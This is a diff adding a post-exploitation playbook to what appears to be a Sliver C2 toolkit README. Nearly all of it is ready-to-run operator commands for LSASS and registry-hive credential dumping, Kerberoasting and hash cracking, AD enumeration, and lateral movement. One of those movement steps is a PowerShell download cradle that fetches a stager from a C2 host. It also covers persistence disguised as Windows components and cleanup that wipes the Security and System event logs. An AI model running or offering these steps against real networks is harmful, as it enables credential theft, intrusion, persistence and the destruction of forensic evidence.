@@ -110,6 +110,180 @@ sliver (IMPLANT) > rev2self                        # Revert impersonation
 
 ---
 
+## Post-Exploitation Playbook
+
+### Install BOF Extensions (One-Time)
+
+Sliver's armory provides BOFs (Beacon Object Files) that run in-process — no exe dropped to disk.
+
+```
+sliver > armory                                    # List all available extensions
+sliver > armory install sa-whoami                   # AD user/group enumeration
+sliver > armory install sa-netlocalgroup            # Local group membership
+sliver > armory install nanodump                    # LSASS memory dump
+sliver > armory install bof-credentials             # Credential harvesting BOFs
+sliver > armory install bof-registry                # Registry operations
+sliver > armory install sharp-hound-4               # BloodHound collection
+```
+
+### Credential Dumping — LSA Secrets & SAM
+
+**Requires:** High integrity (Run as Administrator)
+
+```
+# ─── Dump LSASS with nanodump (most evasive) ───
+sliver (IMPLANT) > nanodump -w C:\Windows\Temp\debug.dmp
+# Download the dump, then on Kali: pypykatz lsa minidump debug.dmp
+
+# ─── SAM + SECURITY + SYSTEM hive extraction ───
+sliver (IMPLANT) > execute -o reg save HKLM\SAM C:\Windows\Temp\sam
+sliver (IMPLANT) > execute -o reg save HKLM\SECURITY C:\Windows\Temp\security
+sliver (IMPLANT) > execute -o reg save HKLM\SYSTEM C:\Windows\Temp\system
+sliver (IMPLANT) > download C:\Windows\Temp\sam
+sliver (IMPLANT) > download C:\Windows\Temp\security
+sliver (IMPLANT) > download C:\Windows\Temp\system
+# On Kali: secretsdump.py -sam sam -security security -system system LOCAL
+
+# ─── In-memory with execute-assembly (SharpSecDump) ───
+sliver (IMPLANT) > execute-assembly /opt/tools/SharpSecDump.exe -target=localhost
+# Dumps SAM, LSA secrets, and cached domain creds — no files touch disk
+
+# ─── LSA Whisper — extract LSA secrets via BOF ───
+sliver (IMPLANT) > sa-netlocalgroup                 # Enumerate local admins first
+sliver (IMPLANT) > execute-assembly /opt/tools/SharpLSA.exe       # Dump LSA secrets
+# Or use mimikatz BOF:
+sliver (IMPLANT) > execute -o "cmd.exe /c rundll32.exe" -ppid 5056  # Under svchost
+```
+
+### Kerberoasting
+
+**Requires:** Domain-joined machine, any domain user token
+
+```
+# ─── Rubeus Kerberoast (execute-assembly, runs in-memory) ───
+sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt
+sliver (IMPLANT) > download C:\Windows\Temp\hashes.txt
+# On Kali: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# ─── Rubeus Kerberoast — specific high-value SPNs ───
+sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /spn:MSSQLSvc/db01.corp.local:1433
+sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /user:svc_sql /nowrap
+# /nowrap gives you a single-line hash — easier to copy
+
+# ─── AS-REP Roasting (no pre-auth accounts) ───
+sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:C:\Windows\Temp\asrep.txt
+sliver (IMPLANT) > download C:\Windows\Temp\asrep.txt
+# On Kali: hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+# ─── Targeted: find kerberoastable accounts first ───
+sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /stats
+# Shows all accounts with SPNs, encryption type, and password last set
+# Target accounts with RC4 (type 23) — faster to crack than AES
+```
+
+### AD Enumeration
+
+```
+# ─── BloodHound collection (in-memory) ───
+sliver (IMPLANT) > sharp-hound-4 -- -c All --outputdirectory C:\Windows\Temp --zipfilename bh.zip
+sliver (IMPLANT) > download C:\Windows\Temp\bh.zip
+# Import into BloodHound GUI — find shortest path to DA
+
+# ─── Quick AD recon via BOFs ───
+sliver (IMPLANT) > sa-whoami                        # Current user + group memberships
+sliver (IMPLANT) > sa-netlocalgroup Administrators   # Who is local admin?
+sliver (IMPLANT) > execute -o "net group \"Domain Admins\" /domain"
+sliver (IMPLANT) > execute -o "nltest /dclist:corp.local"
+sliver (IMPLANT) > execute -o "nltest /domain_trusts"
+```
+
+### Lateral Movement
+
+```
+# ─── PsExec (built-in, drops a service binary) ───
+sliver (IMPLANT) > psexec -t TARGET_IP -s /tmp/beacon.bin
+# Uses named pipe pivot — new session calls back through current implant
+
+# ─── WMI Execution (fileless) ───
+sliver (IMPLANT) > execute-assembly /opt/tools/SharpWMI.exe action=exec computername=TARGET command="powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://C2_IP/stager.ps1')"
+
+# ─── SMB Named Pipe Pivot (no new outbound connection) ───
+# Generate a pivot implant:
+sliver > generate beacon --named-pipe TARGET --os windows --arch amd64 --format shellcode --save /tmp/pivot.bin
+# Then from existing session:
+sliver (IMPLANT) > psexec -t TARGET_IP -s /tmp/pivot.bin
+# New beacon routes through the existing session's tunnel
+
+# ─── Token Impersonation + Lateral ───
+sliver (IMPLANT) > steal-token 1234                 # Steal DA token from process
+sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"     # Verify access
+sliver (IMPLANT) > psexec -t DC01 -s /tmp/beacon.bin  # Move to DC
+
+# ─── RDP via SOCKS proxy ───
+sliver (IMPLANT) > socks5 start -p 1080
+# On Kali: proxychains xfreerdp /v:TARGET /u:admin /p:Password123 /cert-ignore
+# Or use the built-in rdp command:
+sliver (IMPLANT) > rdp -u admin -p Password123 --target TARGET_IP
+
+# ─── Pass-the-Hash with Rubeus + Over-Pass-the-Hash ───
+sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
+sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"     # Now works with the injected ticket
+
+# ─── Azure RunCommand (for Azure VMs — no agent needed) ───
+# See AZURE-KILLCHAIN.md for the full guide
+# Quick version from Kali:
+./deploy-runcommand.sh --token ARM_TOKEN --sub SUB_ID --rg RG --vm VM --implant-url http://C2/implant.exe
+```
+
+### Persistence
+
+```
+# ─── Scheduled Task ───
+sliver (IMPLANT) > execute -o schtasks /create /tn "Microsoft\Windows\NetTrace\DiagCheck" /tr "C:\ProgramData\Microsoft\Network\svchost.exe" /sc onstart /ru SYSTEM /f
+
+# ─── Registry Run Key ───
+sliver (IMPLANT) > execute -o reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /t REG_SZ /d "C:\ProgramData\Microsoft\Network\svchost.exe" /f
+
+# ─── WMI Event Subscription (survives reboots, no files in startup) ───
+sliver (IMPLANT) > execute-assembly /opt/tools/SharpStay.exe action=WMIEvent eventname=DiagCheck command="C:\ProgramData\Microsoft\Network\svchost.exe"
+```
+
+### Cleanup
+
+```
+sliver (IMPLANT) > rev2self                         # Revert impersonation
+sliver (IMPLANT) > execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
+sliver (IMPLANT) > execute -o reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /f
+sliver (IMPLANT) > rm C:\ProgramData\Microsoft\Network\svchost.exe
+sliver (IMPLANT) > rm C:\Windows\Temp\*.dmp
+sliver (IMPLANT) > rm C:\Windows\Temp\hashes.txt
+sliver (IMPLANT) > execute -o "wevtutil cl Security"
+sliver (IMPLANT) > execute -o "wevtutil cl System"
+sliver (IMPLANT) > exit                              # Kill the beacon
+```
+
+### Tool Setup (Kali)
+
+Download the .NET assemblies used above:
+```bash
+# Rubeus (Kerberoast, pass-the-hash, ticket ops)
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O /opt/tools/Rubeus.exe
+
+# SharpSecDump (SAM + LSA + cached creds)
+wget https://github.com/G0ldenGunSec/SharpSecDump/releases/latest/download/SharpSecDump.exe -O /opt/tools/SharpSecDump.exe
+
+# SharpHound (BloodHound collector)
+wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe -O /opt/tools/SharpHound.exe
+
+# SharpWMI (WMI lateral movement)
+wget https://github.com/GhostPack/SharpWMI/raw/master/SharpWMI/bin/Release/SharpWMI.exe -O /opt/tools/SharpWMI.exe
+
+# Impacket (secretsdump, psexec, wmiexec from Kali)
+pip3 install impacket
+```
+
+---
+
 ## Documentation
 
 | Guide | Description |
